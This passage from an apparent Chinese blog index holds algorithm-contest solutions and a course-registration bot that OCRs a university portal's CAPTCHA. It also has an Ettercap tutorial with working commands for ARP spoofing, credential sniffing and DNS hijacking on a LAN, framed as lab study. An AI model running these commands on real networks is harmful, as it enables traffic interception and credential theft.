0 &amp;&amp; atoi(str2) == 0 &amp;&amp; atoi(str1) == 0) break; } return 0;}","link":"/post/EOJ1424/"},{"title":"EOJ2069 Asteroids","text":"第一次接触二分图匹配。 题目简介 N×N网格中有若干个小行星，武器每次发射可以清除一行或一列，问最少需要发射多少次才能清除全部小行星。 说明所有小行星横坐标为一个点集，纵坐标为另一个点集。对于每个小行星，在其横坐标与纵坐标之间连一条边，则问题转化为求二分图最小点覆盖。又因为二分图最小点覆盖==二分图最大匹配，所以直接跑匈牙利就行。 12345678910111213141516171819202122232425262728293031323334#include &lt;bits/stdc++.h&gt;using namespace std;bool path[505][505], v[505];int ast[505], n, k;bool dfs(int x){ for (int i = 1; i &lt;= n; ++i) if (!v[i] &amp;&amp; path[x][i]) { v[i] = 1; if (!ast[i] || dfs(ast[i])) { ast[i] = x; return 1; } } return 0;}int main(){ int x, y, ans = 0; cin &gt;&gt; n &gt;&gt; k; while (k--) { scanf(&quot;%d%d&quot;, &amp;x, &amp;y); path[x][y] = 1; } for (int i = 1; i &lt;= n; ++i) { memset(v, 0, sizeof(v)); if (dfs(i)) ++ans; } printf(&quot;%d\\n&quot;, ans); return 0;}","link":"/post/EOJ2069/"},{"title":"ECNU 第三轮课程掠夺者","text":"用来在第三轮选课中抢课。 背景介绍众所周知，ECNU 将选课分为三轮——前两轮中，每人拥有 100 意愿值，并需要将意愿值合理地分配到想要选择的课程上。每轮结束后，系统按意愿值优先的规则进行筛选。而在第三轮，也就是接近开学时的最后一轮中，系统会按时间优先的规则进行筛选，即先到先得。与此同时，为了防止“屯课”的现象出现，系统只会在第三轮选课期间每天中午 12：00 放出退课后产生的名额。 毫无疑问，对于前两轮的倒霉蛋来说，要想在第三轮有所收获，这部分名额极为重要。于是课程掠夺者脚本应运而生。 技术要点脚本由 Python 语言编写，主要用到的第三方库与辅助程序有： selenium chromedriver.exe Pillow Tesseract-OCR pytesseract retrying 技术原理利用selenium+chromedriver控制 Chrome 浏览器自动执行命令，并访问 ECNU 公共数据库登录页面。根据用户输入的学号和公共数据库密码进行登录，用户也可以自行更改代码开头的信息来进一步简化操作。由于登录时要求输入验证码，利用Pillow+Tesseract-OCR+pytesseract库，先根据验证码在网页中的相对位置截取图片，随后转换为灰度图并用ImageEnhance增加图片对比度，最后自动识别图中的验证码并输入。 登录后依次点击相应的链接。因为在选课期间公共数据库响应速度往往非常慢，而脚本中利用driver的选择器定位要点击的链接，所以如果响应过慢将出现NoSuchElementException。最初用time.sleep(足够长的时间)作为解决方案，但是这一时间并不容易设置。因此引入retrying库，利用@retry装饰器使得定位链接时，如果出现异常就等待 2 秒再重试。这样既不会让每次点击之前都等待 2 秒，又能保证加载过慢时程序不至于异常终止。 最后则在选课系统中重复输入课程序号（来自用户输入）并点击选课按钮，如果没有选上则刷新页面，直到选上为止。可以通过关闭脚本打开的 Chrome 浏览器，或是按下&lt;Ctrl+C&gt;来终止程序。 注意事项 运行前请保证已经下载chromedriver.exe且其所在路径已添加到环境变量的Path中。同时，请保证已经安装selenium, Pillow, pytesseract, retrying四个 Python 第三方库（都可以通过pip install安装）以及Tesseract-OCR软件。 安装Tesseract-OCR时需要在Path中添加软件根目录，并在系统变量中添加TESSDATA_PREFIX变量，值为软件根目录下的tessdata目录。 本脚本文件仅支持 Chrome 浏览器。PhantomJS 和 Firefox 同理，只是驱动程序不同。 使用时，打开命令行，切换到course.py文件所在目录，运行python course.py并按提示输入信息。随后可以最小化命令行和被打开的 Chrome 浏览器，进行其它工作。 可以直接修改代码开头my_id、my_pswd、my_course_id三行内容以简化使用流程。 使用本脚本并不能保证用户抢到心仪的课程。 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from selenium import webdriverfrom PIL import Image, ImageEnhanceimport pytesseractfrom retrying import retrymy_id = input('Your ID:')my_pswd = input('Your password:')my_course_id = input('ID of course you need:')# my_id = 'id'# my_pswd = 'password'# my_course_id = 'course id'print('Welcome. Press &lt;Ctrl+C&gt; or close the browser to quit.')# chromedriver.exe must be added to PATHdriver = webdriver.Chrome()driver.get(&quot;http://portal.ecnu.edu.cn&quot;)driver.save_screenshot('0.png')codeImage = driver.find_element_by_id('codeImage')img = Image.open('0.png')# Adjust location &amp;&amp; size for img.crop()left = codeImage.location['x'] * 1.51top = codeImage.location['y'] * 1.5right = left + codeImage.size['width'] * 1.3bottom = top + codeImage.size['height'] * 1.5img = img.crop((left, top, right, bottom))img = img.convert('L')img = ImageEnhance.Contrast(img).enhance(3)# Single text line with only numbersmy_code = pytesseract.image_to_string(img,config='--psm 7 -c tessedit_char_whitelist=0123456789')driver.find_element_by_id('un').send_keys(my_id)driver.find_element_by_id('pd').send_keys(my_pswd)driver.find_element_by_name('code').send_keys(my_code)driver.find_element_by_class_name('login_box_landing_btn').click()def stop_func(attempts, delay): print('Loading... Attempts: %d, Delay: %d' % (attempts, delay))@retry(wait_fixed=2000, stop_func=stop_func)def click_edu(): driver.find_element_by_link_text('本科教学').click()def switch_2_new_tag(): driver.switch_to.window(driver.window_handles[-1])@retry(wait_fixed=2000, stop_func=stop_func)def click_course(): driver.find_element_by_css_selector('li.li_1 a.subMenu').click()@retry(wait_fixed=2000, stop_func=stop_func)def click_choose(): driver.find_elements_by_link_text('点击进入')[2].click()@retry(wait_fixed=2000, stop_func=stop_func)def click_entry(): driver.find_element_by_link_text('进入选课&gt;&gt;&gt;&gt;').click()@retry(wait_fixed=2000, stop_func=stop_func)def click_filter(): driver.find_element_by_id('electableLessonList_filter_submit').click()@retry(wait_fixed=2000, stop_func=stop_func)def click_op(): driver.find_element_by_class_name('lessonListOperator').click()click_edu()switch_2_new_tag()click_course()click_choose()click_entry()switch_2_new_tag()while True: try: # An exception will occur if user closes the browser driver.find_element_by_name('electableLesson.no').send_keys(my_course_id) except: break click_filter() click_op() al = driver.switch_to.alert if al.text == '上限人数已满，请稍后再试': al.accept() print('Refreshing...') driver.refresh() continue else: al.accept() print('Success!') break 附录 TODO: 存储用户输入的信息，使用户不用修改代码也能一劳永逸。这涉及到密码存储的问题——不能直接存储明文，所以需要加密机制。采用base64之类的编码等于没加密，采用单向散列函数则无法还原成密码明文，必须用双向的（也就是严格意义上的）加密机制，由于数据量不大，DES, 3DES, AES, RSA都是值得考虑的选择。问题是我真的需要把这个简单的脚本复杂化吗？ 虽然PIL被Pillow淘汰了，用的时候还是要from PIL import ...。 webdriver的选择器和 DOM 的document.queryselector很像，优势在于更灵活，甚至可以用xpath，劣势嘛……没有jQuery了。 调整裁剪图片时用了location和size，不知道为什么在网页上和在截图里数值上会有偏差，最后靠乱调参数才搞定。。也许是巧合，数值上正好差了 1.5 倍？ 除了用ImageEnhance库增加验证码正确识别率以外，还可以用图像二值化的办法。理论上来说用pytesseract来识别 ECNU 公共数据库的验证码实在是杀鸡用牛刀了。 不明白pytesseract的config里的参数的含义，在网上粗略找了找没啥发现，命令行里敲--help就出现了。还是没有养成命令行看官方文档的习惯。 关闭浏览器时会在最后的while True循环第一行触发NoSuchWindowException，毕竟浏览器都被关了嘛。所以额外加了个try...except。","link":"/post/CourseRobber/"},{"title":"EOJ1499 矩阵快速幂求斐波那契数列","text":"终于等到你，写了一晚上的矩阵快速幂。 题目简介 给定 n，求斐波那契数列前 n 项和。0 &lt; n &lt; 1e9 说明快速幂实现方式和整数差不多，没什么好讲的。而对于斐波那契数列，不难发现：\\begin{equation}\\begin{pmatrix}F*{n+2}\\F*{n+1}\\\\end{pmatrix}{=}\\begin{pmatrix}1 &amp; 1\\1 &amp; 0\\\\end{pmatrix}\\begin{pmatrix}F*{n+1}\\F_n\\\\end{pmatrix}\\end{equation}我们记\\begin{pmatrix}1 &amp; 1\\1 &amp; 0\\\\end{pmatrix}为A，由此我们可以推得：\\begin{equation}\\begin{pmatrix}F*{n+1}\\F_n\\\\end{pmatrix}{=}A^n\\begin{pmatrix}1\\0\\\\end{pmatrix}\\end{equation}于是对A^n求解就很容易得到答案了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#define MOD 100000000using namespace std;typedef long long ll;struct Mat{ ll m[2][2];};Mat MatMul(Mat A, Mat B){ Mat ret; for (int i = 0; i &lt; 2; ++i) for (int j = 0 ; j &lt; 2; ++j){ ret.m[i][j] = 0; for (int k = 0; k &lt; 2; ++k) ret.m[i][j] += A.m[i][k] * B.m[k][j] % MOD; } return ret;}Mat MatPow(Mat A, ll n){ Mat ret; ret.m[0][0]=1; ret.m[0][1]=0; ret.m[1][0]=0; ret.m[1][1]=1; while (n){ if (n &amp; 1) ret = MatMul(ret, A); A = MatMul(A, A); n &gt;&gt;= 1; } return ret;}int main(){ ll n; while(cin &gt;&gt; n){ Mat ans, A; ans.m[0][0]=1; ans.m[0][1]=0; A.m[0][0]=1; A.m[0][1]=1; A.m[1][0]=1; A.m[1][1]=0; ans = MatMul(ans, MatPow(A, n + 1)); cout &lt;&lt; ans.m[0][0] - 1 &lt;&lt; endl; } return 0;}","link":"/post/EOJ1499/"},{"title":"EOJ3322 万年历","text":"历史题，就是所谓 OEIS 题的同类。 为什么说是历史题？来自某百科： 罗马教皇格里高利十三世在 1582 年组织了一批天文学家，根据哥白尼日心说计算出来的数据，对儒略历作了修改。将 1582 年 10 月 5 日到 14 日之间的 10 天宣布撤销，继 10 月 4 日之后为 10 月 15 日。后来人们将这一新的历法称为“格里高利历”，也就是今天世界上所通用的历法，简称格里历或公历。 所以怎么算星期几？ 蔡勒公式(Zeller formula)： 1582.10.4 后：$$ w=(y+[\\frac{y}{4}]+[\\frac{c}{4}]-2c+[\\frac{13(m+1)}{5}]+d-1)%7 $$ 1582.10.4 及之前：$$ w=(y+[\\frac{y}{4}]+[\\frac{c}{4}]-2c+[\\frac{13(m+1)}{5}]+d+2)%7 $$ 其中 m, d 对应月日，c 为年份前两位（世纪数减 1），y 为年份后两位。 基姆拉尔森公式(Kim larsson calculation formula)： $$ w=(d+2m+[\\frac{3(m+1)}{5}]+y+[\\frac{y}{4}]-[\\frac{y}{100}]+[\\frac{y}{400}]+1)%7 $$ 需要注意的是，基姆拉尔森公式的结果为 0 时表示周一，6 表示周日，以此类推。 注意事项 两个公式都需要把每年的 1，2 两月看作上一年的 13，14 两月。 另有一种需要事先计算年月基数表的计算方法，由于较繁琐这里不再赘述。 代码（仅以蔡勒公式为例） 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;void calc_day(int y, int m, int d){ if (m == 1 || m == 2){ //1月2月情况特判 --y; m += 12; } int c = y / 100; //取年份前两位 int yy = y - c * 100; //取年份后两位 int day = yy + yy / 4 + c / 4 - 2 * c + 13 * (m + 1) / 5 + d - 1; //蔡勒公式 if (y &lt;= 1582 &amp;&amp; m &lt;= 10 &amp;&amp; d &lt;= 4) day += 3; //判断是否在1582年10月4日前 while (day &lt; 0) day += 7; //结果可能为负，这里避免了容易出错的负数取模运算 day %= 7; switch(day){ case 1: printf(&quot;Monday\\n&quot;);break; case 2: printf(&quot;Tuesday\\n&quot;);break; case 3: printf(&quot;Wednesday\\n&quot;);break; case 4: printf(&quot;Thursday\\n&quot;);break; case 5: printf(&quot;Friday\\n&quot;);break; case 6: printf(&quot;Saturday\\n&quot;);break; default: printf(&quot;Sunday\\n&quot;); } return;}int main(void){ int y, m, d; scanf(&quot;%d-%d-%d&quot;, &amp;y, &amp;m, &amp;d); calc_day(y, m, d); return 0;} 公式证明好像不会 ╥﹏╥","link":"/post/EOJ3322/"},{"title":"EOJ3367 咸鱼翻身","text":"最大区间和。初学时被惊艳到了。 题目简介 给定01序列，选择一个区间，对区间中每个数取反（0变1，1变0），求1最多能有多少个。 说明最大区间和问题。对于1，翻转后收益（1的个数）为-1；对于0，翻转后收益为+1。方便起见，读入时直接把数字转换为收益。最后求最大区间和，加上原来1的个数就是答案。由于和最大的区间中不会有-1出现，区间所覆盖的位置也不会包括原来1所在的位置，因此不会重复。 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;int a[100001];int main(){ int n,i,j,sum = 0,tot = 0,ans; scanf(&quot;%d&quot;, &amp;n); for (i = 0; i &lt; n; ++i){ scanf(&quot;%d&quot;, &amp;j); if (j){ a[i] = -1; sum++; } else a[i] = 1; } ans = a[0]; for (i = 0; i &lt; n; ++i){ if (tot &gt; 0) tot += a[i]; else tot = a[i]; ans = (tot&gt;ans)?tot:ans; } printf(&quot;%d\\n&quot;, ans + sum); return 0;}","link":"/post/EOJ3367/"},{"title":"EOJ3384 食物链","text":"没想到并查集这么难。 题目简介 动物王国中有三类动物 A,B,C，这三类动物的食物链构成了有趣的环形。A 吃 B，B 吃 C，C 吃 A。现有 N 个动物，以 1－N 编号。每个动物都是 A,B,C 中的一种，但是我们并不知道它到底是哪一种。有人用两种说法对这 N 个动物所构成的食物链关系进行描述：第一种说法是 1 X Y，表示 X 和 Y 是同类。第二种说法是 2 X Y，表示 X 吃 Y。此人对 N 个动物，用上述两种说法，一句接一句地说出 K 句话，这 K 句话有的是真的，有的是假的。当一句话满足下列三条之一时，这句话就是假话，否则就是真话：当前的话与前面的某些真的话冲突，就是假话；当前的话中 X 或 Y 比 N 大，就是假话；当前的话表示 X 吃 X，就是假话。你的任务是根据给定的 N (1≤N≤50 000) 和 K 句话 (0≤K≤100 000)，输出假话的总数。 说明经典并查集（对我来说还是太难了）。代码中kind数组为0表示与父节点同类，1表示被父节点吃，2表示吃父节点。初始化时，每个节点自身成为一个集合，并且父节点也是自身（0：同类）。路径压缩的时候可以顺便更新掉kind数组的状态。 Union函数（其实是Unite函数）中： 如果x,y不在一个集合中，关于合并之后kind要怎么变化，这个式子我纯粹靠找规律写了，可能网上有更靠谱的解法。 如果x,y同属一个集合，那么只需要验证这句话是不是对的就可以了。 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;using namespace std;int father[50005], kind[50005];int Find(int x){ if (x == father[x]) return father[x]; int y = Find(father[x]); kind[x] = (kind[x] + kind[father[x]]) % 3; return father[x] = y;}int Union(int op, int sp1, int sp2){ int x = Find(sp1), y = Find(sp2); if (x == y){ if ((kind[sp1] - kind[sp2] + 3) % 3 == op - 1) return 0; return 1; } father[x] = y; kind[x] = (-kind[sp1] + op - 1 + kind[sp2] + 3) % 3; return 0;}int main(){ int n, k, op, sp1, sp2, cnt = 0, i; cin &gt;&gt; n &gt;&gt; k; for (i = 1; i &lt;= n; ++i){ father[i] = i; kind[i] = 0; } for (i = 0;i &lt; k; ++i){ cin &gt;&gt; op &gt;&gt; sp1 &gt;&gt; sp2; if (op == 2 &amp;&amp; sp1 == sp2) ++cnt; else if (sp1 &gt; n || sp2 &gt; n) ++cnt; else cnt += Union(op, sp1, sp2); } cout &lt;&lt; cnt &lt;&lt; endl; return 0;}","link":"/post/EOJ3384/"},{"title":"EOJ3388 Balanced Lineup","text":"区间RMQ，比线段树简单得多的方法。当然，不是什么时候都能用。 题目简介 给定一个数列，求询问区间中的最大最小值之差。 说明普通方法用线段树或ST算法，对这题来说RMQ就可以了。时间复杂度O(nlogn)。 1234567891011121314151617181920212223242526272829303132333435#include &lt;cstdio&gt;#include &lt;algorithm&gt;#include &lt;cmath&gt;using namespace std;int linemax[50001][20], linemin[50001][20];void rmq(int n){ for (int j = 1; j &lt; 20; ++j) for (int i = 1; i &lt;= n; ++i) if (i + (1 &lt;&lt; j) - 1 &lt;= n){ linemax[i][j] = max(linemax[i][j - 1], linemax[i + (1 &lt;&lt; (j - 1))][j - 1]); linemin[i][j] = min(linemin[i][j - 1], linemin[i + (1 &lt;&lt; (j - 1))][j - 1]); }}int main(void){ int n, len, a, b, x, maxc, minc; scanf(&quot;%d%d&quot;, &amp;n, &amp;len); for (int i = 1; i &lt;= n; ++i){ scanf(&quot;%d&quot;, &amp;linemax[i][0]); linemin[i][0] = linemax[i][0]; } rmq(n); while(len--){ scanf(&quot;%d%d&quot;, &amp;a, &amp;b); x = (int)(log(b - a + 1) / log(2)); maxc = max(linemax[a][x], linemax[b - (1 &lt;&lt; x) + 1][x]); minc = min(linemin[a][x], linemin[b - (1 &lt;&lt; x) + 1][x]); printf(&quot;%d\\n&quot;, maxc - minc); } return 0;}","link":"/post/EOJ3388/"},{"title":"EOJ3458 Cards Game","text":"来自Google Kickstart Round G 2017的B题。MST的奇怪用法。 题目简介 每次从N张牌中选择两张，代价为min(r[i]^b[j], r[j]^b[i]), 然后从两张中选择一张删去进入下一轮，循环直至只剩一张牌，求最小代价和。 说明可以发现有N张牌，N-1次操作。在扔掉的牌与留下的牌之间连边，则边的权值==题目中的代价。这样求最小代价和就转化成求图的最小生成树问题，prim或者kruskal（如下代码）直接过。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;const int N = 101;int r[N], b[N];int fa[N];int union_find(int x){ return fa[x] == x ? x : fa[x] = union_find(fa[x]);}bool unite(int a, int b){ a = union_find(a); b = union_find(b); if (a != b) { fa[a] = b; return 1; } return 0;}vector&lt;tuple&lt;int, int, int&gt; &gt; v;ll kruskal(){ sort(v.begin(), v.end()); ll ans = 0; for (auto i : v) { int u, v, w; tie(w, u, v) = i; if (unite(u, v)) ans += w; } return ans;}int main(){ int cas, n, i; cin &gt;&gt; cas; for (int t = 1; t &lt;= cas; ++t) { cin &gt;&gt; n; v.clear(); for (i = 0; i &lt; n; ++i) cin &gt;&gt; r[i]; for (i = 0; i &lt; n; ++i) cin &gt;&gt; b[i]; for (i = 0; i &lt; n; ++i) { for (int j = i+1; j &lt; n; ++j) v.emplace_back(min(r[i]^b[j], r[j]^b[i]), i, j); fa[i] = i; } printf(&quot;Case #%d: %lld\\n&quot;, t, kruskal()); } return 0;}","link":"/post/EOJ3458/"},{"title":"Ettercap 简易入门","text":"关于 Ettercap 的有趣例子。 安装与配置安装很容易： 1apt install ettercap-text-only 使用前需要修改配置，给予 Ettercap 足够的权限。配置文件位于/etc/ettercap/etter.conf，找到： 123[priv]ec_uid = 65500ec_gid = 65500 将两个值都修改为 0，表示给予 root 权限。 另外，如果想嗅探 https 包则需要根据配置文件的提示去除指定的注释。我这里使用的是 Linux 系统，防火墙为 iptables，所以我取消注释了 177 和 178 两行。 123# if you use iptables: redir_command_on = &quot;iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport&quot; redir_command_off = &quot;iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport&quot; ARP 欺骗我们知道，ARP 请求包是广播发送的，然而 ARP 应答包则是单播发送的。因此通过 Ettercap，我们可以在收到同一网段内的其它主机广播的 ARP 请求后，向它们发送 ARP 应答包，使它们认为我们的主机就是网关。这样一来，任何发送至外网的请求都将经过我们的主机。 如果我们成功实施了 ARP 欺骗，作为一个伪网关，就可以截获同网段内所有发送至外网的流量。我们可以选择不再将这些数据包转发至外网，这将使得该网段内所有其它主机无法上网： 1arpspoof -i eth0 -t 192.168.159.128 192.168.159.2 其中-i指定网卡接口，-t指定要欺骗的目标主机，最后的 IP 地址是本网段内真正的网关地址。如何查看真正的网关地址呢？ 简便的方法是直接查看当前连接的网络属性，里面会直接显示默认网关字段。另一种方法是traceroute 任意外网网址，这样第一跳的地址必定是网关地址。 123$ traceroute baidu.comtraceroute to baidu.com (123.125.114.144), 30 hops max, 60 byte packets 1 _gateway (192.168.159.2) 0.947 ms 0.819 ms 0.681 ms^C 结果： 或者，我们照常转发流量（这个操作由 Ettercap 自动完成），但是将数据包中的图片存储下来： 12ettercap -i eth0 -Tq -M arp:remote /// ///driftnet -i eth0 -b -a -d pic 其中-T表示只使用命令行，-q表示不显示具体数据包信息，-M指定使用的模式，///表示同网段下所有主机，-b表示声音提醒，-a保存图片，-d指定保存目录。 由于 Ettercap 截获的是整个数据包，因此常常可以获取比图片更敏感的信息。举个例子，假设我们已经开始 ARP 欺骗： 1ettercap -i eth0 -Tq -M arp:remote /// /// 这时，同网段主机访问了一个 http 网站并进行登录。我们可以在命令行看到： 由于帐号和密码是明文传输的，我们可以轻易得到帐号10175101282和密码aaaaaa。 DNS 劫持作为伪网关，我们当然也可以将一些域名解析到指定的 IP，实现 DNS 劫持。首先修改另一个配置文件/etc/ettercap/etter.dns，在这里面可以输入域名匹配规则与解析规则，如: 1*.edu.cn A 192.168.159.135 可以看出，前面是一个类正则的域名匹配规则，然后中间指定A Record，最后指定要解析到哪个 IP 地址上，这里我们使用了攻击者主机内网 IP。 保存后，我们在本机开一个服务器： 1service apache2 start 然后开始 DNS 劫持： 1ettercap -i eth0 -Tq -P dns_spoof /// /// 当受害者主机访问类似aaa.ecnu.edu.cn的域名时，将会看到我们的 Apache 服务器的默认页面，这样就完成了 DNS 劫持。命令行提示： 1dns_spoof: A [aaa.ecnu.edu.cn] spoofed to [192.168.159.135] 结果： 小结显然上述攻击都有一个共同的前提，那就是攻击者和受害者处于同一网段。由此不难发现，局域网内的安全是十分脆弱的，这是由局域网内主机互相访问的便利性所带来的代价，而如何防护这类攻击是需要进一步思考的问题。","link":"/post/Ettercap/"},{"title":"ElGamal 密码方案的椭圆曲线形式实现","text":"抽代课的上机练习。 方案简述 设$E$为$F_q$上的椭圆曲线，一般记为$E(F_q)$，设$P=(x_p,y_p)\\in E(F_q)$，且$P$的次数足够大，任取$1&lt;s&lt;ord(P)$，令$Q=(x_q,y_q)=sP$，则$(E(F_q),P,Q)$为公钥，$s$为私钥。 消息$m$满足$0\\leq m&lt;F_q$，任取$1&lt;r&lt;F_q$，计算$(x_1,y_1)=𝑟𝑃,(x_2,y_2)=rQ,c=m\\cdot x_2$，则密文为$(x_1,y_1,c)$。 解密时，计算$(x’,y’)=s(x_1,y_1)$，再计算$m’=c\\cdot x’^{-1}$，解得明文。 正确性证明 因为$(x’,y’)=s(x_1,y_1)=srP=rsP=rQ=(x_2,y_2)$，所以$x’=x_2$，因此$m’=c\\cdot x’^{-1}=c\\cdot x_2^{-1}=m$，得证。 方案的安全性依赖于椭圆曲线上的离散对数问题。 练习内容 令$E:y^2=x^3+x+6$为$F_{11}$上的一条椭圆曲线，求$E$上的所有点 令$P=(2,7)$，取$s=5$，求公钥 设消息$m=3$，取$r=7$，求$m$的密文$(x_1,y_1,c)$ 对$(x_1,y_1,c)$做解密运算，求$(x’,y’)$，并进一步求其明文$m’$ 代码$F_{11}$比较小就直接硬编码了，也可以利用模 p 平方根算法来求解二次剩余对应的平方根。 需要注意的地方是不要对负数求逆元，因此做减法时可以额外加一个+p。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# general funcsdef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('Modular inverse does not exist') else: return x % m# constantsp = 11a,b,c,d = 1,0,1,6 # y^2 = ax^3 + bx^2 + cx + dsqrt = [-1,1,-1,5,2,4,-1,-1,-1,3,-1]def E(x): return (a*x**3 + b*x**2 + c*x + d) % p# dy/dxdef dE(x, y): return (3*a*x**2 + 2*b*x + c) * modinv(2*y, p)def add(P, Q): x1,y1,x2,y2 = P[0],P[1],Q[0],Q[1] if x1==x2 and y1==y2: K = dE(x1,y1) else: K = (y2-y1) * modinv(x2-x1+p, p) x0 = (K**2 - x1 - x2) % p y0 = (K * (x1 - x0) - y1) % p return (x0, y0)def mul(P, x): Q = P for i in range(x-1): Q = add(Q, P) return Qdef init(): for i in range(p): y2 = E(i) print('x={}, y^2={}'.format(i, y2), end=' ') if sqrt[y2] != -1: print((i, sqrt[y2]), (i, p-sqrt[y2])) else: print()init()P = (2,7)s = 5Q = mul(P,s) # Q = sPEstr = '{}x^3 + {}x^2 + {}x + {}'.format(a,b,c,d)print('Pubkey: ({},{},{})'.format(Estr,P,Q))m = 3r = 7c1 = mul(P,r) # (x1,y1)c2 = mul(Q,r) # (x2,y2)C = m * c2[0] % pprint('Ciphertext: {}'.format(c1+(C,))) # (x1,y1,C)C_ = mul(c1,s) # (x',y')print(&quot;(x',y'): {}&quot;.format(C_))m_ = C * modinv(C_[0],p) % p # C * (x')^(-1)print('Plaintext: {}'.format(m_))","link":"/post/ElGamalECC/"},{"title":"EOJ新生训练","text":"记录了新生训练上遇到的一些奇怪题，主要是 Week2 遇到的。 Week 2总体来说不好做……但是确实也不难。 A 给定正整数 n，k，求$f(n,k)=\\sum^n_{i=1}i^k$，结果对 19260817 取模。1 &lt;= n &lt;= 1e7, 0 &lt;= k &lt;= 1e9时限 0.698s（？？？） 上来用拉格朗日插值法直接 WA。。正解其实比想象的简单。先欧拉筛出素数，对素数用快速幂求出i^k存起来。然后对合数的i^k只要用素数的结果求就可以了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include&lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;const int p = 19260817;const int maxn = 1e7+5;bool flag[maxn];ll f[maxn], prime[maxn], n, k, cnt;inline ll pow_mod(ll a, ll b){ ll res = 1; while (b) { if (b &amp; 1) res = res * a % p; a = a * a % p; b &gt;&gt;= 1; } return res;}inline void sieve(){ for (int i = 2; i &lt;= n; ++i) { if (!flag[i]) { prime[cnt++] = i; f[i] = pow_mod(i, k); } for (int j = 0; j &lt; cnt &amp;&amp; i * prime[j] &lt;= n; ++j) { flag[i * prime[j]] = 1; f[i * prime[j]] = f[i] * f[prime[j]] % p; if (i % prime[j] == 0) break; } }}int main(){ scanf(&quot;%lld%lld&quot;, &amp;n, &amp;k); ll sum = 1; sieve(); for (ll i = 2; i &lt;= n; ++i) sum = (sum + f[i]) % p; printf(&quot;%lld\\n&quot;, sum); return 0;} B 给出一个长度为 N 的整数数列 A，对于这个数列进行任意多操作。每次选择一个任意的整数，并将任意 P 个数字加上这个数字。输出 YES 或 NO，表示能否通过这种方法将这个数列中每个数字同时变成零。1 ≤ P ≤ N ≤ 1e5, |Ai| &lt;= 1e6 结论题。显然当n==p时只有所有数字相等时才是 YES；n&gt;p时，数字总和如果是 p 的倍数则 YES。其实凭感觉可以想到：要把所有数字变成 0，和必须是 p 的倍数。不过严格的证明则是将所有n&gt;p的情况转化为n==p+1的情况。 12345678910111213141516171819202122232425262728#include &lt;bits/stdc++.h&gt;using namespace std;int n, p, i, tmp, sum;int main(){ cin &gt;&gt; n &gt;&gt; p; if (n == p) { scanf(&quot;%d&quot;, &amp;tmp); for (i = 1; i &lt; n; ++i) { scanf(&quot;%d&quot;, &amp;sum); if (sum != tmp) break; } printf(&quot;%s\\n&quot;, i == n ? &quot;YES&quot; : &quot;NO&quot;); }else { for (i = 0; i &lt; n; ++i) { scanf(&quot;%d&quot;, &amp;tmp); sum += tmp; } printf(&quot;%s\\n&quot;, sum % p ? &quot;NO&quot; : &quot;YES&quot;); } return 0;} C 给任意一个大于 1 的正整数 N,输出 N 可以分解成最少几个质数(可以相同)的和。2 ≤ N ≤ 1e15 据说是 Codeforces 原题。如果本身是质数那么直接输出 1。运用哥德巴赫猜想，任何大于 2 的偶数可以被分解为两个质数之和。也就是偶数输出 2。如果 n 是奇合数但还可以被分解为两个质数，那只可能是一奇一偶。偶质数只能是 2，也就是说 n-2 必须是质数。其他情况输出 3。 1234567891011121314151617181920212223#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;ll n;inline bool isprime(ll m){ for (ll i = 2; i * i &lt;= m; ++i) if (!(m % i)) return 0; return 1;}int main(){ cin &gt;&gt; n; if (n == 2) printf(&quot;1\\n&quot;); else if (!(n&amp;1)) printf(&quot;2\\n&quot;); else if (isprime(n)) printf(&quot;1\\n&quot;); else if (isprime(n-2)) printf(&quot;2\\n&quot;); else printf(&quot;3\\n&quot;); return 0;} D 给出 n 个正整数，问有多少种方法在这 n 个数字的中取其中一些数字，使得这些数字之和超过 k。若答案超过 20 000 000，输出 -1。1 ≤ n ≤ 1e41 ≤ ai ≤ 1e81 ≤ k ≤ 1e10 降序排序，预处理前缀和，然后 dfs+剪枝。最优性剪枝：如果当前和已经大于 k 则剪枝，ans要加上2^(剩余数字个数)——这一步还可以剪枝：由于2^25&gt;2e7，所以一旦剩余数字个数大于等于 25 也剪枝。可行性剪枝：如果当前和加上后面所有数（用前缀和）都不大于 k 那么剪枝。 123456789101112131415161718192021222324252627282930313233#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;const int maxn = 1e4+5;int a[maxn], n, ans;bool flag;ll k, suma[maxn];inline void dfs(int dep, ll sum){ if (flag || sum + suma[n]-suma[dep-1] &lt;= k) return; if (sum &gt; k) { n-dep+1 &gt;= 25 ? flag = 1 : ans += 1&lt;&lt;(n-dep+1); return; } dfs(dep+1, sum + a[dep]); dfs(dep+1, sum);}int main(){ cin &gt;&gt; n &gt;&gt; k; for (int i = 1; i &lt;= n; ++i) scanf(&quot;%d&quot;, a+i); sort(a+1, a+1+n, greater&lt;int&gt;()); for (int i = 1; i &lt;= n; ++i) suma[i] = suma[i-1] + a[i]; dfs(1, 0); printf(&quot;%d\\n&quot;, flag ? -1 : ans); return 0;} E 给出整数数列${an}$,对整个数列进行尽可能少的次数操作，每次操作可以将数列中任意一项加 1 或者减 1，使得最终的数列$b_1,b_2,b_3,…,b_n$满足对数列中的任一项$b_i(i&gt;=2)$,有 $b_i=b_{i−1}+i$。求最少的操作次数。1 ≤ n ≤ 1e5，1 ≤ ai ≤ 1e10 设${c_n}={a_1,a_2-2,a_3-5,a_4-9…}$，这题等价于求$|c_1-x|+|c_2-x|+…+|c_n-x|$的最小值。根据高中函数知识，x 应该取${c_n}$的中位数。那么我们构造出${c_n}$然后排下序取中间下标，这题就做完了…… 12345678910111213141516171819202122232425262728293031#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long 